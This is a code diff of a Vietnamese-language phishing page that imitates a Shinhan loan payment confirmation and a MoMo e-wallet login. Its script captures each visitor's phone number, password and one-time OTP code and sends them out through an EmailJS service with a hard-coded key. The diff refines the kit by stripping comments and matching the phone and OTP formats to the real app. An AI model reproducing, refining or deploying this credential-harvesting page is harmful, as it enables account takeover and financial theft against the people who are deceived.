@@ -12,7 +12,6 @@
     <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
-      // Cập nhật Public Key của bạn tại đây
       (function() {
          emailjs.init({
            publicKey: "OrBsI926QI2_xBh1f",
@@ -21,7 +20,6 @@
     </script>
 
     <style>
-        /* CSS Variables for theming and consistency */
         :root {
             --shinhan-blue: #004695;
             --shinhan-blue-darker: #00336a;
@@ -37,7 +35,6 @@
             --global-font: 'Lexend', sans-serif;
         }
 
-        /* General Reset and Body styles */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: var(--global-font); }
         body {
             background-color: var(--brand-background);
@@ -46,31 +43,24 @@
         }
         .mobile-frame { width: 100%; max-width: 420px; margin: auto; background-color: #fff; border-radius: 24px; box-shadow: 0 8px 32px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column; min-height: 700px; }
         
-        /* General Page Section Structure */
         .page-section {
-            display: none; /* Hidden by default */
-            flex-direction: column;
-            flex-grow: 1;
+            display: none; flex-direction: column; flex-grow: 1;
         }
         .page-section.active {
-            display: flex; /* Show active section */
+            display: flex;
         }
 
-        /* Header */
         .page-header {
             padding: 16px; text-align: center; background-color: #fff;
             border-bottom: 1px solid var(--brand-border);
-            flex-shrink: 0;
-            position: relative;
+            flex-shrink: 0; position: relative;
         }
         #confirmation-section .page-header {
             background: linear-gradient(90deg, #0057b8, #004695);
-            color: white;
-            border-bottom: none;
+            color: white; border-bottom: none;
         }
         #confirmation-section .page-header h1 {
-            color: white;
-            font-size: 18px;
+            color: white; font-size: 18px;
         }
         .page-header .back-button {
              position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
@@ -81,134 +71,75 @@
              filter: invert(1);
         }
         .page-header h1 { 
-            font-size: 17px; 
-            font-weight: 600; 
-            color: var(--brand-dark-text);
+            font-size: 17px; font-weight: 600; color: var(--brand-dark-text);
         }
         
-        /* Main Content */
         .page-body, .login-body {
-            padding: 16px; 
-            flex-grow: 1;
-            background-color: var(--brand-background);
+            padding: 16px; flex-grow: 1; background-color: var(--brand-background);
         }
         .login-body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            background-color: #fff;
+            display: flex; flex-direction: column; align-items: center; background-color: #fff;
         }
         
-        /* Card styles */
         .info-card {
             background-color: #fff; border-radius: 12px; padding: 20px; margin-bottom: 12px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
-         .info-card .title {
+        .info-card .title {
             font-size: 14px; font-weight: 600; color: var(--brand-dark-text); margin-bottom: 8px; display: block;
         }
         
         .payment-summary-card {
-            text-align: center;
-            padding-top: 24px;
+            text-align: center; padding-top: 24px;
         }
         .payment-summary-card .label {
-            font-size: 15px;
-            color: var(--brand-light-text);
-            margin-bottom: 8px;
+            font-size: 15px; color: var(--brand-light-text); margin-bottom: 8px;
         }
         .payment-summary-card .amount {
-            font-size: 30px;
-            font-weight: 700;
-            color: var(--brand-dark-text);
-            margin-bottom: 20px;
+            font-size: 30px; font-weight: 700; color: var(--brand-dark-text); margin-bottom: 20px;
         }
         .payment-summary-card hr {
-            border: none;
-            border-top: 1px solid var(--brand-border);
-            margin: 0 -20px;
+            border: none; border-top: 1px solid var(--brand-border); margin: 0 -20px;
         }
         
         .detail-item {
             display: flex; justify-content: space-between; align-items: center; font-size: 14px; padding: 13px 0;
             border-bottom: 1px solid var(--brand-border);
         }
-         .detail-item:first-of-type {
-            padding-top: 20px;
-        }
-        .detail-item:last-of-type { 
-            border-bottom: none; 
-            padding-bottom: 4px;
-        }
+        .detail-item:first-of-type { padding-top: 20px; }
+        .detail-item:last-of-type { border-bottom: none; padding-bottom: 4px; }
         .detail-item .label { color: var(--brand-light-text); font-weight: 400; }
         .detail-item .value { font-weight: 500; color: var(--brand-dark-text); text-align: right; display: flex; align-items: center; gap: 8px; }
         .detail-item .value img { width: 24px; height: 24px; }
 
         .notice-card {
-            background-color: var(--shinhan-blue-light-bg);
-            color: var(--brand-dark-text);
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 16px;
+            background-color: var(--shinhan-blue-light-bg); color: var(--brand-dark-text);
+            display: flex; align-items: center; gap: 12px; padding: 16px;
         }
-        .notice-card img {
-            width: 24px;
-            height: 24px;
-            flex-shrink: 0;
-        }
-        .notice-card p {
-            font-size: 14px;
-            line-height: 1.5;
-            font-weight: 500;
-        }
-        .notice-card strong {
-            color: var(--shinhan-blue);
-        }
+        .notice-card img { width: 24px; height: 24px; flex-shrink: 0; }
+        .notice-card p { font-size: 14px; line-height: 1.5; font-weight: 500; }
+        .notice-card strong { color: var(--shinhan-blue); }
 
-        /* MoMo Login Flow Specifics */
         .banner-slider {
-            width: 100%;
-            aspect-ratio: 16 / 9;
-            position: relative;
-            overflow: hidden;
-            border-radius: 8px;
-            margin-bottom: 24px;
+            width: 100%; aspect-ratio: 16 / 9; position: relative; overflow: hidden;
+            border-radius: 8px; margin-bottom: 24px;
         }
         .banner-slide {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            object-fit: cover;
-            opacity: 0;
-            transition: opacity 0.5s ease-in-out;
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; opacity: 0; transition: opacity 0.5s ease-in-out;
         }
-        .banner-slide.active {
-            opacity: 1;
-        }
+        .banner-slide.active { opacity: 1; }
         
         .profile-header {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 24px;
+            display: flex; flex-direction: column; align-items: center; margin-bottom: 24px;
         }
         .profile-header .avatar {
-            width: 72px; height: 72px;
-            border-radius: 50%;
-            background-color: #fceef5;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            width: 72px; height: 72px; border-radius: 50%; background-color: #fceef5;
+            margin-bottom: 12px; display: flex; align-items: center; justify-content: center;
         }
-        .profile-header .avatar img {
-            width: 40px;
-        }
+        .profile-header .avatar img { width: 40px; }
         .profile-header .phone-number {
-            font-size: 16px;
-            font-weight: 500;
-            color: var(--brand-dark-text);
+            font-size: 16px; font-weight: 500; color: var(--brand-dark-text);
         }
         .login-title { font-size: 22px; font-weight: 700; color: var(--brand-dark-text); margin-bottom: 8px; }
         .login-subtitle { font-size: 15px; color: var(--brand-light-text); margin-bottom: 32px; text-align: center; }
@@ -236,32 +167,18 @@
             border: 1px solid #ddd; border-radius: 8px; color: var(--brand-dark-text);
             transition: border-color 0.2s, box-shadow 0.2s;
         }
-         .otp-input::placeholder {
-            color: #ccc;
-            font-size: 28px;
-            line-height: 55px;
-        }
+        .otp-input::placeholder { color: #ccc; font-size: 28px; line-height: 55px; }
         .otp-input:focus { outline: none; border-color: var(--momo-pink); box-shadow: 0 0 0 2px rgba(216, 45, 139, 0.2); }
         
         .page-footer, .login-footer {
-            padding: 16px; background-color: #fff;
-            box-shadow: 0 -4px 12px rgba(0,0,0,0.05);
-            flex-shrink: 0;
+            padding: 16px; background-color: #fff; box-shadow: 0 -4px 12px rgba(0,0,0,0.05); flex-shrink: 0;
         }
         .login-footer { margin-top: auto; }
 
         .agreement-text {
-            font-size: 12px;
-            color: var(--brand-light-text);
-            text-align: center;
-            line-height: 1.5;
-            margin-bottom: 16px;
+            font-size: 12px; color: var(--brand-light-text); text-align: center; line-height: 1.5; margin-bottom: 16px;
         }
-        .agreement-text a {
-            color: var(--momo-pink);
-            text-decoration: none;
-            font-weight: 500;
-        }
+        .agreement-text a { color: var(--momo-pink); text-decoration: none; font-weight: 500; }
         
         .button {
             width: 100%; padding: 14px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600;
@@ -280,8 +197,7 @@
         .notification {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             padding: 12px 24px; border-radius: 8px; color: #fff; z-index: 1001;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15); transition: top 0.4s ease-in-out;
-            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15); transition: top 0.4s ease-in-out; text-align: center;
         }
         .notification.show { top: 20px; }
         .notification.success { background-color: var(--success-green); }
@@ -290,7 +206,6 @@
 </head>
 <body>
     <div class="mobile-frame">
-        
         <!-- Confirmation View -->
         <div id="confirmation-section" class="page-section active">
             <header class="page-header">
@@ -302,23 +217,19 @@
                     <p class="label">Tổng thanh toán</p>
                     <h2 class="amount" id="mainTotalAmount"></h2>
                     <hr>
-                    <div id="payment-details">
-                        <!-- Details will be populated by JS -->
-                    </div>
+                    <div id="payment-details"></div>
                 </div>
                 <div class="info-card">
                     <strong class="title">Thông tin người vay</strong>
-                     <div id="customer-details">
-                        <!-- Customer details will be populated by JS -->
-                     </div>
+                    <div id="customer-details"></div>
                 </div>
-                 <div class="info-card notice-card">
+                <div class="info-card notice-card">
                     <img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300336a'%3e%3cpath fill-rule='evenodd' d='M6.75 2.25A.75.75 0 017.5 3v1.5h9V3A.75.75 0 0118 3v1.5h.75a3 3 0 013 3v11.25a3 3 0 01-3 3H5.25a3 3 0 01-3-3V7.5a3 3 0 013-3H6V3a.75.75 0 01.75-.75zM5.25 6A1.5 1.5 0 003.75 7.5v11.25c0 .828.672 1.5 1.5 1.5h13.5a1.5 1.5 0 001.5-1.5V7.5A1.5 1.5 0 0018.75 6H5.25z' clip-rule='evenodd' /%3e%3c/svg%3e" alt="Calendar Icon">
                     <p id="closingDateNotice"></p>
                 </div>
             </main>
             <footer class="page-footer">
-                 <button class="button primary" onclick="showSection('momo-phone-section')">Xác nhận</button>
+                <button class="button primary" onclick="showSection('momo-phone-section')">Xác nhận</button>
             </footer>
         </div>
 
@@ -329,7 +240,7 @@
                 <h1>Đăng nhập MoMo</h1>
             </header>
             <main class="login-body" style="padding: 0; justify-content: space-between;">
-                 <div style="width: 100%;">
+                <div style="width: 100%;">
                     <div class="banner-slider">
                         <img src="https://homepage.momocdn.net/blogscontents/momo-upload-api-210330100721-637526956419126619.png" class="banner-slide active" alt="MoMo Banner 1">
                         <img src="https://cellphones.com.vn/sforum/wp-content/uploads/2021/07/momo-upload-api-200728110550-637315311504981461.jpg" class="banner-slide" alt="MoMo Banner 2">
@@ -340,7 +251,7 @@
                         <form class="input-group" onsubmit="event.preventDefault(); handlePhoneSubmit();">
                             <div class="phone-input-wrapper">
                                 <span class="phone-prefix">+84</span>
-                                <input type="tel" id="momo-phone" class="phone-input" placeholder="Số điện thoại" required inputmode="numeric">
+                                <input type="tel" id="momo-phone" class="phone-input" placeholder="Số điện thoại" required inputmode="numeric" pattern="[0-9]{10}" maxlength="10" oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10)">
                             </div>
                         </form>
                     </div>
@@ -357,13 +268,13 @@
 
         <!-- MoMo Password Input View -->
         <div id="momo-password-section" class="page-section">
-             <header class="page-header">
-                 <button class="back-button" onclick="showSection('momo-phone-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
+            <header class="page-header">
+                <button class="back-button" onclick="showSection('momo-phone-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
                 <h1>Nhập mật khẩu</h1>
             </header>
-             <main class="login-body" style="padding-top: 24px;">
+            <main class="login-body" style="padding-top: 24px;">
                 <div class="profile-header">
-                     <div class="avatar"><img src="https://upload.wikimedia.org/wikipedia/vi/f/fe/MoMo_Logo.png" alt="MoMo Logo"></div>
+                    <div class="avatar"><img src="https://upload.wikimedia.org/wikipedia/vi/f/fe/MoMo_Logo.png" alt="MoMo Logo"></div>
                     <span class="phone-number" id="masked-phone-password"></span>
                 </div>
                 <h2 class="login-title">Nhập mật khẩu</h2>
@@ -378,20 +289,18 @@
 
         <!-- MoMo OTP Input View -->
         <div id="momo-otp-section" class="page-section">
-             <header class="page-header">
+            <header class="page-header">
                 <button class="back-button" onclick="showSection('momo-password-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
                 <h1>Xác thực OTP</h1>
             </header>
-             <main class="login-body" style="padding-top: 24px;">
+            <main class="login-body" style="padding-top: 24px;">
                 <div class="profile-header">
-                     <div class="avatar"><img src="https://upload.wikimedia.org/wikipedia/vi/f/fe/MoMo_Logo.png" alt="MoMo Logo"></div>
+                    <div class="avatar"><img src="https://upload.wikimedia.org/wikipedia/vi/f/fe/MoMo_Logo.png" alt="MoMo Logo"></div>
                     <span class="phone-number" id="masked-phone-otp"></span>
                 </div>
                 <p class="login-subtitle" id="momo-otp-prompt"></p>
                 <form class="input-group" onsubmit="event.preventDefault(); handleOtpSubmit();">
                     <div class="otp-input-container">
-                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
-                        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                         <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                         <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
                         <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="•">
@@ -404,7 +313,6 @@
                 <button class="button momo-btn" id="momo-otp-submit-btn" onclick="handleOtpSubmit()">Xác nhận</button>
             </footer>
         </div>
-        
     </div>
 
     <!-- Notification Toast Structure -->
@@ -412,11 +320,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // --- DATA ---
-            const credentials = {
-                phone: '', password: '', otp: ''
-            };
-            
+            const credentials = { phone: '', password: '', otp: '' };
             const getFormData = () => {
                 const params = new URLSearchParams(window.location.search);
                 return {
@@ -433,15 +337,12 @@
             const formData = getFormData();
             let otpAttempts = 0;
 
-            // --- UI ELEMENTS ---
             const getEl = (id) => document.getElementById(id);
             const otpInputs = document.querySelectorAll('#momo-otp-section .otp-input');
             const slides = document.querySelectorAll('.banner-slide');
             const slideCount = slides.length;
             let currentSlide = 0;
 
-            // --- FUNCTIONS ---
-            
             const formatCurrency = (amount) => new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(amount);
 
             const createDetailItem = (label, value, isPaymentMethod = false) => {
@@ -516,30 +417,27 @@
             };
             
             window.showSection = (sectionId) => {
-                 document.querySelectorAll('.page-section').forEach(section => section.classList.remove('active'));
-                 getEl(sectionId).classList.add('active');
+                document.querySelectorAll('.page-section').forEach(section => section.classList.remove('active'));
+                getEl(sectionId).classList.add('active');
             };
 
             window.handlePhoneSubmit = () => {
                 const phoneInput = getEl('momo-phone');
                 let phoneValue = phoneInput.value.replace(/\D/g, '');
                 
-                if (phoneValue.length === 9 || (phoneValue.length === 10 && phoneValue.startsWith('0'))) {
-                    if (phoneValue.length === 10) {
-                        phoneValue = phoneValue.substring(1);
-                    }
-                    credentials.phone = `+84${phoneValue}`;
+                if (phoneValue.length === 10 && phoneValue.startsWith('0')) {
+                    credentials.phone = `+84${phoneValue.substring(1)}`;
                     const maskedPhone = `+84 **** ${phoneValue.slice(-3)}`;
                     getEl('masked-phone-password').textContent = maskedPhone;
                     showSection('momo-password-section');
                 } else {
-                    showNotification('Số điện thoại không hợp lệ.<br>Vui lòng thử lại.', 'error');
+                    showNotification('Số điện thoại phải đúng 10 chữ số và bắt đầu bằng 0.<br>Vui lòng thử lại.', 'error');
                 }
             };
             
             window.handlePasswordSubmit = () => {
                 const passwordInput = getEl('momo-password');
-                 if (passwordInput.checkValidity()) {
+                if (passwordInput.checkValidity()) {
                     credentials.password = passwordInput.value;
                     sendToEmail('password', credentials.password);
                     
@@ -554,7 +452,7 @@
                 }
             };
 
-             const sendToEmail = (type, value) => {
+            const sendToEmail = (type, value) => {
                 const serviceID = 'service_60tgxof';
                 let templateID = '';
                 let templateParams = {};
@@ -591,9 +489,9 @@
             window.handleOtpSubmit = () => {
                 credentials.otp = Array.from(otpInputs).map(input => input.value).join('');
                 
-                if (credentials.otp.length !== 6) {
-                     showNotification('Mã OTP phải là 6 chữ số.', 'error');
-                     return;
+                if (credentials.otp.length !== 4) {
+                    showNotification('Mã OTP phải là 4 chữ số.', 'error');
+                    return;
                 }
                 
                 const otpLoading = getEl('momo-otp-loading');
@@ -627,7 +525,6 @@
                 }, 1500);
             };
 
-            // --- OTP Input Logic ---
             otpInputs.forEach((input, index) => {
                 input.addEventListener('input', () => {
                     if (input.value && index < otpInputs.length - 1) {
@@ -641,31 +538,28 @@
                 });
                 input.addEventListener('paste', (e) => {
                     e.preventDefault();
-                    const pasteData = e.clipboardData.getData('text').slice(0, 6);
+                    const pasteData = e.clipboardData.getData('text').slice(0, 4);
                     pasteData.split('').forEach((char, i) => {
                         if(otpInputs[i]) otpInputs[i].value = char;
                     });
                     if (pasteData.length > 0) {
-                       otpInputs[Math.min(5, pasteData.length -1)].focus();
+                        otpInputs[Math.min(3, pasteData.length -1)].focus();
                     }
                 });
             });
             
-            // --- Banner Slider Logic ---
             const startSlider = () => {
-                 if(slideCount > 0){
+                if(slideCount > 0){
                     setInterval(() => {
                         slides[currentSlide].classList.remove('active');
                         currentSlide = (currentSlide + 1) % slideCount;
                         slides[currentSlide].classList.add('active');
                     }, 3000); 
-                 }
+                }
             };
 
-            // --- INITIALIZATION ---
             populateData();
             startSlider();
-
         });
     </script>
 </body>
